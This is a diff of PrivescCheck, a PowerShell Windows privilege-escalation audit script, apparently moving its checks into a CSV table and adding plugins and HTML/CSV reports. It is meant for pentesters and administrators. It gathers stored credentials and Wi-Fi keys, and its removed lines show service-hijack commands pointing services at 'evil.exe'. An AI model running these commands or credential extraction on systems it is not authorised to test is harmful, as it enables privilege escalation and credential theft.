+"HARDEN_LSA", "", "Invoke-LsaProtectionsCheck", "", "Hardening", "LSA protections", "Info", "Info", "Check whether 'lsass' runs as a Protected Process Light and/or if Credential Guard is enabled.", "Table", True, True
+"HARDEN_LAPS", "", "Invoke-LapsCheck", "", "Hardening", "LAPS Settings", "Info", "Info", "Parse the registry and determine whether LAPS is configured and enabled.", "List", True, True
+"HARDEN_PS_TRANSCRIPT", "", "Invoke-PowershellTranscriptionCheck", "", "Hardening", "PowerShell Transcription", "Info", "Info", "Check whether PowerShell Transcription is configured and enabled. If so, the path of the output log file will be returned.", "List", True, True
+"HARDEN_BITLOCKER", "", "Invoke-BitlockerCheck", "", "Hardening", "BitLocker", "Vuln", "High", "Check whether BitLocker is configured and enabled on the system drive. Note that this check will yield a false positive if another encryption software is in use.", "List", False, True
+"CONFIG_MSI", "", "Invoke-RegistryAlwaysInstallElevatedCheck", "", "Config", "AlwaysInstallElevated", "Vuln", "High", "Check whether the 'AlwaysInstallElevated' registry keys are configured and enabled. If so any user might be able to run arbitary MSI files with SYSTEM privileges.", "List", False, False
+"CONFIG_WSUS", "", "Invoke-WsusConfigCheck", "", "Config", "WSUS Configuration", "Vuln", "High", "If WSUS is in use, this check will determine whether or not it uses a secure URL. If not, it might be vulnerable to MitM attacks (c.f. 'WSUXploit' / 'WSuspicious').", "List", False, True
+"CONFIG_SCCM", "", "Invoke-SccmCacheFolderCheck", "", "Config", "SCCM Cache Folder", "Info", "Info", "Checks whether the SCCM cache folder exists. Manual investigation might be required during post-exploitation.", "List", True, True
+"CONFIG_SCCM_VULN", "", "Invoke-SccmCacheFolderVulnCheck", "", "Config", "SCCM Cache Folder", "Vuln", "Medium", "Checks whether the current user can browse the SCCM cache folder. If so, hardcoded credentials might be extracted from MSI package files or scripts.", "List", False, False
+"NET_TCP_ENDPOINTS", "", "Invoke-TcpEndpointsCheck", "", "Network", "TCP Endpoints", "Info", "Info", "List all TCP ports that are in a LISTEN state. For each one, the corresponding process is also returned.", "Table", True, True
+"NET_UDP_ENDPOINTS", "", "Invoke-UdpEndpointsCheck", "", "Network", "UDP Endpoints", "Info", "Info", "List all UDP ports that are in a LISTEN state. For each one, the corresponding process is also returned. DNS is filtered out to minimize the output.", "Table", True, True
+"NET_WLAN", "", "Invoke-WlanProfilesCheck", "", "Network", "Saved Wifi Profiles", "Info", "Info", "Enumerate saved Wifi profiles and extract clear-text WEP/WPA pre-shared keys and passphrases (if applicable).", "List", True, True
+"UPDATE_HISTORY", "", "Invoke-WindowsUpdateCheck", "", "Updates", "Last Windows Update Date", "Info", "Info", "Interact with the Windows Update service and determine when the system was last updated. Note that this check might be unreliable.", "Table", True, True
+"UPDATE_HOTFIX", "", "Invoke-HotFixCheck", "", "Updates", "Installed Updates and Hotfixes", "Info", "Info", "Enumerate the installed updates and hotfixes by parsing the registry. If this fails, the check will fall back to the built-in 'Get-HotFix' cmdlet.", "Table", True, True
+"UPDATE_HOTFIX_VULN", "", "Invoke-HotFixVulnCheck", "", "Updates", "System up to date?", "Vuln", "Medium", "Enumerate the installed updates and hotfixes and check whether a patch was applied in the last 31 days.", "List", False, True
+"MISC_AVEDR", "", "Invoke-EndpointProtectionCheck", "", "Misc", "Endpoint Protection", "Info", "Info", "Enumerate installed security products (AV, EDR). This check is based on keyword matching (loaded DLLs, running processes, installed applications and registered services).", "Table", True, True
+"MISC_SYSINFO", "", "Invoke-SystemInfoCheck", "", "Misc", "OS Version", "Info", "Info", "Print the detailed version number of the Operating System. If we can't get the update history, this might be useful.", "Table", True, True
+"MISC_ADMINS", "", "Invoke-LocalAdminGroupCheck", "", "Misc", "Local Admin Group", "Info", "Info", "Enumerate the users and groups that belong to the local 'Administrators' group.", "Table", True, True
+"MISC_HOMES", "", "Invoke-UsersHomeFolderCheck", "", "Misc", "User Home Folders", "Info", "Info", "Enumerate local HOME folders and check for potentially weak permissions.", "Table", True, False
+"MISC_MACHINE_ROLE", "", "Invoke-MachineRoleCheck", "", "Misc", "Machine Role", "Info", "Info", "Simply return the machine's role. It can be either 'Workstation', 'Server' or 'Domain Controller'.", "Table", True, True
+"MISC_STARTUP_EVENTS", "", "Invoke-SystemStartupHistoryCheck", "", "Misc", "System Startup History", "Info", "Info", "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't as relevant.", "Table", True, True
+"MISC_STARTUP_LAST", "", "Invoke-SystemStartupCheck", "", "Misc", "Last System Startup", "Info", "Info", "Determine the last system startup date and time based on the current tick count. Note that this might be unreliable.", "Table", True, True
+"MISC_DRIVES", "", "Invoke-SystemDrivesCheck", "", "Misc", "Filesystem Drives", "Info", "Info", "List partitions, removable storage and mapped network shares.", "Table", True, True
+"@
+
+    $AllChecks = New-Object System.Collections.ArrayList
+
+    # Load default checks
+    $AllChecksCsv | ConvertFrom-Csv | ForEach-Object {
+        [void] $AllChecks.Add($_)
     }
 
-    "`r`n"
-
-    Write-Banner -Category "user" -Name "whoami /groups" -Type Conf -Note "Do I belong to any interesting group(s)? Additional groups give you additional privileges. Default groups are filtered out."
-    $Results = Invoke-UserGroupsCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) non-default group(s)."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
+    # Load plugins if any
+    if (test-path $($ScriptPath))
+    {
+        Write-Verbose "Script path: $($ScriptPath)"
+        $ScriptLocation = Split-Path -Parent $ScriptPath -ErrorAction SilentlyContinue -ErrorVariable ErrorSplitPath
+        if (-not $ErrorSplitPath) {
+            $PrivescCheckPluginsCsvPath = Join-Path $ScriptLocation -ChildPath "\PrivescCheckPlugins\PrivescCheckPlugins.csv"
+            Write-Verbose "Plugin definition file: '$($PrivescCheckPluginsCsvPath)'"
+            if (Test-Path -Path $PrivescCheckPluginsCsvPath) {
+                Write-Verbose "Found plugin definition file: $($PrivescCheckPluginsCsvPath)"
+                Get-Content -Path $PrivescCheckPluginsCsvPath -ErrorAction Stop | Out-String | ConvertFrom-Csv | ForEach-Object {
+                    [void] $AllChecks.Add($_)
+                }
+            } else {
+                Write-Verbose "No plugin definition file found."
+            }
+        }
     }
-
-    "`r`n"
-
-    Write-Banner -Category "user" -Name "whoami /priv" -Type Conf -Note "Do I have any interesting privilege(s)? Privileges such as SeImpersonate or SeAssignPrimaryToken might allow you to run code as SYSTEM."
-    $Results = Invoke-UserPrivilegesCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) potentially interesting privilege(s)."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "user" -Name "Environment Variables" -Type Conf -Note "Environment variables may contain some sensitive information."
-    $Results = Invoke-UserEnvCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) potentially interesting result(s)."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "services" -Name "Non-default Services" -Type Info -Note "Is there any non-default / third-party service?"
-    $Results = Invoke-InstalledServicesCheck
-    if (([object[]]$Results).Length -gt 0) {
-        "[*] Found $(([object[]]$Results).Length) service(s)."
-        $Results | Select-Object -Property Name,DisplayName | Format-Table
-        $Results | Format-List 
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "services" -Name "Service Permissions" -Type Vuln -Note "Can we modify the configuration of any service through the Service Control Manager? (sc.exe config VulnService binpath= C:\Temp\evil.exe)"
-    $Results = Invoke-ServicesPermissionsCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) vulnerable service(s)."
-        $Results | Format-List 
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "services" -Name "Service Permissions (Registry)" -Type Vuln -Note "Can we modify the configuration of any service in the Registry? (reg.exe add HKLM\[...]\Services\VulnService /v ImagePath /d C:\Temp\evil.exe /f)"
-    $Results = Invoke-ServicesPermissionsRegistryCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) result(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
+    else{Write-Host 'Plugin Loading not possible due to in memory exeution'}
     
-    Write-Banner -Category "services" -Name "Service Binary Permissions" -Type Vuln -Note "Can we modify the executable itself or can we somehow control one of its arguments? (copy C:\Temp\evil.exe C:\APPS\MyCustomApp\service.exe)"
-    $Results = Invoke-ServicesImagePermissionsCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) result(s)."
-        $Results | Format-List 
+    # Load plugin scripts if any
+    $AllChecks | Where-Object { $_.File -ne "" } | Select-Object -ExpandProperty File | Sort-Object -Unique | ForEach-Object {
+        Write-Verbose "Plugin required: $($_)"
+        $FilePath = Join-Path $ScriptLocation -ChildPath "\PrivescCheckPlugins\$($_)"
+        Get-Content -Path $FilePath -ErrorAction Stop | Out-String | Invoke-Expression
+    }
+
+    $CheckCounter = 0
+    $AllChecks | ForEach-Object {
+
+        $CurrentCheck = $_
+
+        # Get the 'RunIfAdmin' flag's value from the CSV data 
+        $RunIfAdmin = [System.Convert]::ToBoolean($CurrentCheck.RunIfAdmin)
+
+        if (($IsAdmin -and $RunIfAdmin) -or (-not $IsAdmin)) {
+
+            # If the current user is an admin, run the check only it 'RunIfAdmin' is true.
+            # If the current user is a normal user, simply run the check.
+
+            # Get the 'Extended' flag's value from the CSV data
+            $ExtendedCheck = [System.Convert]::ToBoolean($CurrentCheck.Extended)
+            
+            if ($Extended -or ((-not $Extended) -and (-not $ExtendedCheck))) {
+
+                # If the 'Extended' option was specified, run the check. 
+                # If the 'Extended' option was not specified, run the check only if is is not
+                # marked as an "Extended" one.
+
+                if ($Silent) {
+
+                    # If the 'Silent' option was specified, don't print the output of the check but
+                    # write a progress bar and show the name of the check that is being run.
+
+                    $CheckCounter += 1
+                    $Percentage = ($CheckCounter * 100) / ($AllChecks.Count)
+                    Write-Progress -Activity "$($CurrentCheck.Category.ToUpper()) > $($CurrentCheck.DisplayName)" -PercentComplete $Percentage
+                    $CheckResult = Invoke-Check -Check $CurrentCheck
+
+                } else {
+
+                    # If the 'Silent' option was not specified, print a banner that shows some 
+                    # information about the current check. Then, run the check and print the 
+                    # output either as a table or a list, depending on the 'Format' value in
+                    # the CSV data.
+
+                    Write-CheckBanner -Check $CurrentCheck
+                    $CheckResult = Invoke-Check -Check $CurrentCheck
+                    Write-CheckResult -CheckResult $CheckResult
+                }
+            }
+        }
+    }
+
+    # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'.
+    # Therefore, this will be only visible if run from a 'real' terminal.
+    Write-PrivescCheckAsciiReport
+
+    # If the 'Report' option was specified, write a report to a file using the value of this 
+    # parameter as the basename (or path + basename). The extension is then determined based 
+    # on the chosen format(s).
+    if ($Report) {
+
+        if (-not $Format) {
+
+            # If a format or a format list was not specified, default to the TXT format.
+
+            [string[]] $Format = "TXT"
+        }
+
+        $Format | ForEach-Object {
+
+            # For each format, build the name of the output report file as BASENAME + . + EXT.
+            # Then generate the report corresponding to the current format and write it to a 
+            # file using the previously formatted filename.
+
+            $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
+            if ($_ -eq "TXT") {
+                Write-TxtReport -AllResults $ResultArrayList | Out-File $ReportFileName
+            } elseif ($_ -eq "HTML") {
+                Write-HtmlReport -AllResults $ResultArrayList | Out-File $ReportFileName
+            } elseif ($_ -eq "CSV") {
+                Write-CsvReport -AllResults $ResultArrayList | Out-File $ReportFileName
+            } else {
+                Write-Warning "`r`nReport format not implemented: $($Format.ToUpper())`r`n"
+            }
+        }
+    }
+
+    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' 
+    # parameter was specified.
+    if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
+
+        Write-Warning "To get more info, run this script with the option '-Extended'."
+    }
+}
+
+function Invoke-Check {
+
+    [CmdletBinding()] param(
+        [object]$Check
+    )
+
+    $Result = Invoke-Expression -Command "$($Check.Command) $($Check.Params)"
+    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result
+    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-List | Out-String)
+    if ($($Check.Type -Like "vuln")) {
+        if ($Result) {
+            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "KO"
+        } else {
+            $Check.Severity = "None"
+            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "OK"
+        }
     } else {
-        "[!] Nothing found."
+        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "N/A"
+    }
+    [void] $ResultArrayList.Add($Check)
+    # $Check.ResultRaw
+    $Check
+}
+
+function Write-CheckBanner {
+
+    [CmdletBinding()] param(
+        [object]$Check
+    )
+
+    function Split-Description {
+        param([string]$Description)
+
+        $DescriptionSplit = New-Object System.Collections.ArrayList
+        $TempOld = ""
+        $TempNew = ""
+        $Description.Split(' ') | ForEach-Object {
+
+            $TempNew = "$($TempOld) $($_)".Trim()
+            if ($TempNew.Length -gt 53) {
+                [void]$DescriptionSplit.Add($TempOld)
+                $TempOld = "$($_)"
+            } else {
+                $TempOld = $TempNew
+            }
+        }
+        if ($TempOld) {
+            [void]$DescriptionSplit.Add($TempOld)
+        }
+        $DescriptionSplit
+    }
+
+    $Title = "$($Check.Category.ToUpper()) > $($Check.DisplayName)"
+    if ($Title.Length -gt 46) {
+        throw "Input title is too long."
+    }
+
+    $Result = ""
+    $Result += "+------+------------------------------------------------+------+`r`n"
+    $Result += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Check.Type.ToUpper()) |`r`n"
+    $Result += "+------+------------------------------------------------+------+`r`n"
+    Split-Description -Description $Check.Description | ForEach-Object {
+        $Result += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $True }) | $($_)$(' '*(53 - ([string]$_).Length)) |`r`n"
+    }
+    $Result += "+------+-------------------------------------------------------+"
+    $Result
+}
+
+function Write-CheckResult {
+
+    [CmdletBinding()] param(
+        [object]$CheckResult
+    )
+
+    if ($CheckResult.ResultRaw) {
+            
+        "[*] Found $(([object[]]$CheckResult.ResultRaw).Length) result(s)."
+
+        if ($CheckResult.Format -eq "Table") {
+            $CheckResult.ResultRaw | Format-Table -AutoSize
+        } elseif ($CheckResult.Format -eq "List") {
+            $CheckResult.ResultRaw | Format-List
+        }
+        
+    } else {
+
+        # If no result was returned by the check, print a message that shows that 
+        # the host is not vulnerable if it's a "vuln" check or, printer a message
+        # that shows that nothing was found.
+
+        if ($CheckResult.Type -eq "Vuln") {
+            "[!] Not vulnerable."
+        } else {
+            "[!] Nothing found."
+        }
     }
 
     "`r`n"
+}
 
-    Write-Banner -Category "services" -Name "Unquoted Paths" -Type Vuln -Note "Can we hijack any service by planting a binary in one of the executable parent folders? (C:\APPS\Foo Bar\service.exe -> copy C:\Temp\evil.exe C:\APPS\Foo.exe)"
-    $Results = Invoke-ServicesUnquotedPathCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) result(s)"
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
+function Write-TxtReport {
+
+    [CmdletBinding()] param(
+        [object[]]$AllResults
+    )
+
+    $AllResults | ForEach-Object {
+
+        Write-CheckBanner -Check $_
+        Write-CheckResult -CheckResult $_
     }
+}
 
-    "`r`n"
+function Write-CsvReport {
 
-    Write-Banner -Category "DLL Hijacking" -Name "System's %PATH%" -Type Vuln -Note "Do we have write permissions in at least one of the system's %PATH% folders?"
-    $Results = Invoke-DllHijackingCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) result(s)."
-        $Results | Format-List 
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "DLL Hijacking" -Name "Hijackable DLLs" -Type Info -Note "Which known DLLs can we potentially hijack on this version Windows?"
-    $Results = Invoke-HijackableDllsCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) result(s)."
-        $Results | Format-List 
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Applications" -Name "Non-default Applications" -Type Info -Note "Is there any non-default / third-party software we could exploit?"
-    $Results = Invoke-InstalledProgramsCheck
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) non-default application(s)."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
+    [CmdletBinding()] param(
+        [object[]]$AllResults
+    )
     
-    Write-Banner -Category "Applications" -Name "Modifiable Applications" -Type Vuln -Note "Do we have write permissions in non-default application folders? If so, we may compromise other user accounts by planting a malicious EXE or DLL."
-    $Results = Invoke-ModifiableProgramsCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) file(s)."
-        $Results | Format-Table
-    } else {
-        "[!] Nothing found."
-    }
+    $AllResults | Sort-Object -Property "Category" | Select-Object "Category","DisplayName","Description","Compliance","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
+}
 
-    "`r`n"
+function Write-HtmlReport {
 
-    Write-Banner -Category "Applications" -Name "Programs Run on Startup" -Type Info -Note "Which applications run automatically on startup?"
-    $Results = Invoke-ApplicationsOnStartupCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) application(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
+    [CmdletBinding()] param(
+        [object[]]$AllResults
+    )
 
-    "`r`n"
+    $JavaScript = @"
+var cells = document.getElementsByTagName('td');
 
-    Write-Banner -Category "Applications" -Name "Scheduled Tasks" -Type Vuln -Note "Can we modify the executable used by a scheduled task? If you want to list all the scheduled tasks, use the command 'Invoke-ScheduledTasksCheck' whith no args."
-    $Results = Invoke-ScheduledTasksCheck -Filtered
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) result(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Applications" -Name "Running Processes" -Type Info -Note "Among the processes that are not owned by the current user, is there anything interesting? In this check, typical windows processes such as 'svchost.exe' are filtered out."
-    $Results = Invoke-RunningProcessCheck
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) process(es)."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Credentials" -Name "SAM/SYSTEM Backup Files" -Type Vuln -Note "Is there any backup of the SAM/SYSTEM hives we can read?"
-    $Results = Invoke-SamBackupFilesCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) readable file(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Credentials" -Name "Unattended Files" -Type Vuln -Note "Is there any Unattend file? Do they contain cleartext credentials?"
-    $Results = Invoke-UnattendFilesCheck
-    if ($Results) {
-        "[+] Found $(([object[]]$Results).Length) password(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Credentials" -Name "WinLogon" -Type Vuln -Note "Does the Winlogon registry key contain any cleartext password? Entries with an empty password field are filtered out."
-    $Results = Invoke-WinlogonCheck
-    if ($Results) {
-        "[*] Found some info:"
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Credentials" -Name "Credential Files" -Type Info -Note "Does the current user have any saved credentials?"
-    $Results = Invoke-CredentialFilesCheck
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) file(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Credentials" -Name "Credential Manager" -Type Info -Note "Is there any credentials saved in the Credential Manager? vault::cred"
-    $Results = Invoke-VaultCredCheck
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) result(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Credentials" -Name "Credential Manager (web)" -Type Info -Note "Is there any web credentials saved in the Credential Manager? vault::list"
-    $Results = Invoke-VaultListCheck
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) result(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Credentials" -Name "GPP Passwords" -Type Vuln -Note "Is there any cached GPP containing a 'cpassword'?"
-    $Results = Invoke-GPPPasswordCheck
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) credential(s)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Registry" -Name "UAC Settings" -Type Conf -Note "Is User Access Control enabled?"
-    $Results = Invoke-UacCheck
-    if ($Results) {
-        "[*] UAC status:"
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-    
-    "`r`n"
-
-    Write-Banner -Category "Registry" -Name "LSA RunAsPPL" -Type Conf -Note "Is lsass running as a Protected Process?"
-    $Results = Invoke-LsaProtectionsCheck
-    if ($Results) {
-        "[*] Found some info."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Registry" -Name "LAPS Settings" -Type Conf -Note "Is the `"Local Administrator Password Solution`" enabled?"
-    $Results = Invoke-LapsCheck
-    if ($Results) {
-        "[*] LAPS status:"
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-    
-    "`r`n"
-
-    Write-Banner -Category "Registry" -Name "PowerShell Transcription" -Type Conf -Note "Is PowerShell Transcription enabled or even configured?"
-    $Results = Invoke-PowershellTranscriptionCheck
-    if ($Results) {
-        "[*] PowerShell Transcription is configured (and enabled?)."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-    
-    "`r`n"
-
-    Write-Banner -Category "Registry" -Name "AlwaysInstallElevated" -Type Conf -Note "Is the 'AlwaysInstallElevated' registry key enabled?"
-    $Results = Invoke-RegistryAlwaysInstallElevatedCheck
-    if ($Results) {
-        "[+] AlwaysInstallElevated is enabled."
-        $Result | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-    
-    "`r`n"
-
-    Write-Banner -Category "Registry" -Name "WSUS Configuration" -Type Conf -Note "Is WSUS configured/enabled? If so, check whether it's vulnerable to the 'Wsuxploit' MITM attack (https://github.com/pimps/wsuxploit)."
-    $Results = Invoke-WsusConfigCheck
-    if ($Results) {
-        "[*] Found some info."
-        $Result | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-    
-    "`r`n"
-
-    Write-Banner -Category "Network" -Name "TCP Endpoints" -Type Info -Note "Is there any interesting/unusual service? Default ports such as 445 are filtered out."    
-    $Results = Invoke-TcpEndpointsCheck #$Results = Invoke-TcpEndpointsCheck -Filtered
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) TCP endpoints."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Network" -Name "UDP Endpoints" -Type Info -Note "Is there any interesting/unusual service? Showing all listening UDP endpoints (except DNS)."
-    $Results = Invoke-UdpEndpointsCheck #$Results = Invoke-UdpEndpointsCheck -Filtered
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) UDP endpoints."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Network" -Name "Saved Wifi Profiles" -Type Info -Note "Can we extract any saved WEP key or PSK passphrase?"
-    $Results = Invoke-WlanProfilesCheck
-    if ($Results) {
-        "[*] Found $(([object[]]$Results).Length) saved Wifi profiles."
-        $Results | Format-List
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Misc" -Name "Last Windows Update Date" -Type Info -Note "Has the OS been updated lately? If the last update is more than 1 month old, we might be able to use some public exploits."
-    $Results = Invoke-WindowsUpdateCheck 
-    if ($Results) {
-        "[*] Last update time:"
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Misc" -Name "OS Version" -Type Info -Note "What is the exact version number of the system? If we can't get the last system update date and time, this can be useful."
-    $Results = Invoke-SystemInfoCheck
-    if ($Results) {
-        "[*] Found some info."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Misc" -Name "Local Admin Group" -Type Info -Note "Who is a member of the local administator group? It might be useful to know which user account we could try to compromise next."
-    $Results = Invoke-LocalAdminGroupCheck
-    if (([object[]]$Results).Length -gt 0) {
-        "[*] The default local admin group has $(([object[]]$Results).Length) member(s)."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
+for (var i=0; i<cells.length; i++) {
+    if (cells[i].innerHTML == "True") {
+        cells[i].style.backgroundColor = '#ff5050';
+    } else if(cells[i].innerHTML == "False") {
+        cells[i].style.backgroundColor = '#00ff99';
+    } else if (cells[i].innerHTML == "Low") {
+      cells[i].innerHTML = "<span class=\"label low\">Low</span>"
+    } else if (cells[i].innerHTML == "Medium") {
+      cells[i].innerHTML = "<span class=\"label medium\">Medium</span>"
+    } else if (cells[i].innerHTML == "High") {
+      cells[i].innerHTML = "<span class=\"label high\">High</span>"
+    } else if (cells[i].innerHTML == "Info") {
+      cells[i].innerHTML = "<span class=\"label info\">Info</span>"
+    } else if (cells[i].innerHTML == "None") {
+        cells[i].innerHTML = "<span class=\"label other\">None</span>"
+    } else if (cells[i].innerHTML == "OK") {
+        cells[i].innerHTML = "<span class=\"label low\">OK</span>"
+    } else if (cells[i].innerHTML == "KO") {
+        cells[i].innerHTML = "<span class=\"label high\">KO</span>"
+    } else if (cells[i].innerHTML == "N/A") {
+        cells[i].innerHTML = "<span class=\"label other\">N/A</span>"
     }
     
-    "`r`n"
+    // If a cell is too large, we need to make it scrollable. But 'td' elements are not 
+    // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
+    // it scrollabale.
+    if (cells[i].offsetHeight > 200) {
+        cells[i].innerHTML = "<div class=\"scroll\">" + cells[i].innerHTML + "</div>";
+        console.log("Cells height is greater than 200");
+    }
+}
+"@
 
-    Write-Banner -Category "Misc" -Name "User Home Folders" -Type Conf -Note "Do we have R/W access to any other home folder?"
-    $Results = Invoke-UsersHomeFolderCheck
-    if ($Results) {
-        "[*] Found some info."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found"
+    $Css = @"
+body {
+    font:1.2em normal Arial,sans-serif;
+    color:#34495E;
+    }
+      
+h1 {
+    text-align:center;
+    text-transform:uppercase;
+    letter-spacing:-2px;
+    font-size:2.5em;
+    margin:20px 0;
+}
+      
+table {
+    border-collapse:collapse;
+    width:100%;
+    border:2px solid #6699ff;
+}
+      
+th {
+    color:white;
+    background:#6699ff;
+    text-align:center;
+    padding:5px 0;
+}
+
+td {
+    text-align:center;
+    padding:5px 5px 5px 5px;
+}
+
+tbody td:nth-child(3) {
+    text-align:left;
+}
+
+/* Render output results with 'pre' style */
+tbody td:nth-child(6) {
+    white-space: pre;
+    margin: 1em 0px;
+    padding: .2rem .4rem;
+    font-size: 87.5%;
+    font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
+    text-align:left;
+}
+      
+tbody tr:nth-child(even) {
+    background:#ECF0F1;
+}
+      
+tbody tr:hover {
+    background:#BDC3C7;
+    color:#FFFFFF;
+}
+
+.scroll {
+    max-height: 200px;
+    overflow: auto;
+}
+
+.label {
+    margin: 8px;
+    padding: 6px;
+    display: block;
+    width: 60px;
+    border-radius: 5px;
+}
+
+.low {background-color: #4CAF50;} /* Green */
+.info {background-color: #2196F3;} /* Blue */
+.medium {background-color: #ff9800;} /* Orange */
+.high {background-color: #f44336;} /* Red */
+.other {background-color: #cccccc;} /* Gray */
+"@
+
+    $Html = @"
+<html>
+<head>
+<style>
+$($Css)
+</style>
+</head>
+<body>
+BODY_TO_REPLACE
+<script>
+$($JavaScript)
+</script>
+</body>
+</html>
+"@
+
+    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment  
+    $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
+    $Html
+}
+
+function Write-PrivescCheckAsciiReport {
+    <#
+    .SYNOPSIS
+
+    Write a short report on the terminal in ASCII-art using 'Write-Host'.
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    Once all the checks were executed, this function writes a table in ASCII-art that summarizes
+    the results with fancy colors. As a pentester or a system administrator, this should help you
+    quickly spot weaknesses on the local machine.
+    
+    .EXAMPLE
+
+    PS C:\> Write-PrivescCheckAsciiReport
+
+    +-----------------------------------------------------------------------------+
+    |                         ~~~ PrivescCheck Report ~~~                         |
+    +----+------+-----------------------------------------------------------------+
+    | OK | None | APPS > Modifiable Apps                                          |
+    | OK | None | APPS > Modifiable Apps Run on Startup                           |
+    | OK | None | CONFIG > SCCM Cache Folder                                      |
+    | OK | None | CONFIG > WSUS Configuration                                     |
+    | OK | None | CONFIG > AlwaysInstallElevated                                  |
+    | NA | Info | CREDS > Credential Manager -> 3 result(s)                       |
+    | NA | Info | CREDS > Credential Manager (web) -> 1 result(s)                 |
+    | OK | None | CREDS > Unattended Files                                        |
+    | OK | None | CREDS > WinLogon                                                |
+    | OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
+    | OK | None | CREDS > GPP Passwords                                           |
